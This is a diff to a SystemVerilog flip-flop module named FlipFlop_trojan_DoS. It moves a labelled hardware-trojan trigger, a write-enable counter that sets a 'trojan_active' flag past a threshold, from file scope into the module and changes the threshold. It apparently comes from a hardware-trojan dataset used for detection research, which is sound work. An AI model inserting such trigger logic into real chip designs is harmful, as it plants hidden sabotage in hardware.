@@ -8,24 +8,6 @@ import BasicTypes::*;
 
 //
 // Usage: FlipFlop#(.FF_WIDTH(32)) ff( out, in , clk, rst );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21517;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (we) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 //
 
 //
@@ -39,6 +21,23 @@ module FlipFlop_trojan_DoS #( parameter FF_WIDTH = 32, parameter RESET_VALUE = 0
     input  logic clk, 
     input  logic rst
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20892)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 20892;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (we) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     logic [FF_WIDTH-1:0] body;
     
